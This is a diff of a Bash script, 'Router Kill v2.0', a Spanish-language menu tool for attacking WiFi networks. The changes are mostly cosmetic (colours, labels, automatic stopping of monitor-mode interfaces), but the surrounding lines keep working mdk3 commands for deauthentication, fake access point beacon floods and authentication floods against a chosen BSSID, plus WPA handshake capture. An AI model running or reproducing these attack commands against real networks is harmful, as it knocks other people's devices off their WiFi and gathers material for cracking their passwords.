@@ -1,3 +1,4 @@
+
 #!/bin/bash
 
 #Author: Facu Salgado parte del codigo esta hecho por Hacking.con.H
@@ -27,11 +28,28 @@ mon="mon"
 function ctrl_c() {
 echo -e "$nc($blue*$nc)$green Presionaste la tecla$red CTRL + C$green Saliendo del Programa.."
 sleep 2
-echo -e "$nc($blue*$nc)$green Detiendo modo monitor en 1 segundo..$nc"
-sleep 1
+checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
+#Verification mode monitor and exit
+if [[ $checkmode == *wlan0mon* ]] 
+then
 airmon-ng stop wlan0mon
+echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+sleep 1
+fi
+
+if [[ $checkmode == *eth0mon* ]] 
+then
 airmon-ng stop eth0mon
 echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+sleep 1
+fi
+
+if [[ $checkmode == *wlan1mon* ]] 
+then
+airmon-ng stop wlan1mon
+echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+sleep 1
+fi
 echo -e "$nc($blue*$nc)$green Gracias por usar nuestro Script $blue by Facu Salgado..$nc"
 sleep 1
 exit
@@ -68,14 +86,14 @@ esac
 
 #Opciones menu
 
-a="Deauth"
-b="Flood Fake Acess Point"
-c="Fake Auth"
-new="Inject Packets"
-d="Detener Monitor Mode"
-e="Capturar Handshake"
-update="Update Program"
-f="Salir"
+a=$'\e[1;35mDeauth Atack\e[01;32m'
+b=$'\e[1;35mFake Point\e[01;32m'
+c=$'\e[1;35mAuth Atttack\e[01;32m'
+new=$'\e[1;35mInject Packets\e[01;32m'
+d=$'\e[1;35mStop monitor mode\e[01;32m'
+e=$'\e[1;35mCapture Handshake\e[01;32m'
+update=$'\e[1;35mUpdate Program\e[01;32m'
+f=$'\e[1;35mExit Program\e[01;32m'
 
 #directory verification
 directory=$(pwd)
@@ -159,7 +177,7 @@ echo -e "$purple(*)$blue Router Kill$red v2.0$blue"
 sleep 2
 echo -e "$purple(*)$blue Script creado por$red Facu Salgado"
 sleep 1
-echo -e "$purple(*)$blue Regalanos una estrella en github$yellow"
+echo -e "$purple(*)$blue Regalanos una estrella en github$green"
 
 export PS3=$'\e[01;35m(*)\e[01;32m Elige una Opcion:\e[01;33m '
 
@@ -232,7 +250,7 @@ echo -e "$nc($blue*$nc)$red Ataque Iniciado..$green Tiempo restante de ataque:$b
 timeout --foreground $sec$s mdk3 $interface$mon d -b $doc -c $ch
 echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
 sleep 2
-echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
+echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$green"
 sleep 2
 airmon-ng stop $interface$mon
 menu_principal
@@ -274,7 +292,7 @@ echo -e "$nc($blue*$nc)$red ATAQUE INICIADO..$green Tiempo restante de ataque:$b
 timeout --foreground $sec$s mdk3 $interface$mon b
 echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
 sleep 2
-echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
+echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$green"
 sleep 2
 airmon-ng stop $interface$mon
 menu_principal
@@ -336,7 +354,7 @@ sleep 2
 timeout --foreground $sec$s mdk3 $interface$mon a -a $doc
 echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
 sleep 2
-echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
+echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$green"
 sleep 2
 airmon-ng stop $interface$mon
 menu_principal
@@ -421,24 +439,33 @@ menu_principal
 
 $d)
 
-echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
+checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
+
+#Verification mode monitor and exit
+
+if [[ $checkmode == *wlan0mon* ]] 
+then
+airmon-ng stop wlan0mon
+echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+sleep 1
+fi
+
+if [[ $checkmode == *eth0mon* ]] 
+then
+airmon-ng stop eth0mon
+echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+sleep 1
+fi
+
+if [[ $checkmode == *wlan1mon* ]] 
+then
+airmon-ng stop wlan1mon
+echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+sleep 1
+fi
+echo -e "$nc($blue*$nc)$green Volviendo al menu principal$green"
 sleep 2
-echo -e "$nc($blue*$nc)$green Escriba la interfaz que se encuentre en modo monitor"
-echo
-echo
-ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
-sleep 1
-echo -e "$green"
-read -p "EScriba la interfaz ➜ " interface
-echo -e "$nc($blue*$nc)$green Deteniendo modo monitor en 3"
-sleep 1
-echo "2"
-sleep 1
-echo "1"
-sleep 1
-airmon-ng stop $interface
-echo -e "$nc($blue*$nc)$green Modo monitor detenido.. saliendo$nc"
-exit
+menu_principal
 
 ;;
 
@@ -495,7 +522,7 @@ echo -e "$nc($blue*$nc)$green El handshake fue capturado exitosamente PATH:$blue
 sleep 4
 echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
 sleep 2
-echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
+echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$green"
 sleep 2
 airmon-ng stop $interface$mon
 menu_principal
@@ -519,17 +546,38 @@ exit
 ;;
 $f)
 
+checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
+
+#Verification mode monitor and exit
+
+if [[ $checkmode == *wlan0mon* ]] 
+then
 airmon-ng stop wlan0mon
+echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+sleep 1
+fi
+
+if [[ $checkmode == *eth0mon* ]] 
+then
 airmon-ng stop eth0mon
 echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
-echo -e "$nc($blue*$nc)$green Gracias por usar nuestro Script $blue by Facu Salgado..$nc"
 sleep 1
+fi
+
+if [[ $checkmode == *wlan1mon* ]] 
+then
+airmon-ng stop wlan1mon
+echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+sleep 1
+fi
+echo -e "$nc($blue*$nc)$green Gracias por usar nuestro Script $blue by Facu Salgado..$nc"
+sleep 2
 exit
 ;;
 
 
 *)
-echo -e "$red(ERROR)$green Opcion no valida $nc"
+echo -e "$red(ERROR)$green Opcion no valida $green"
 ;;
 esac 
 done
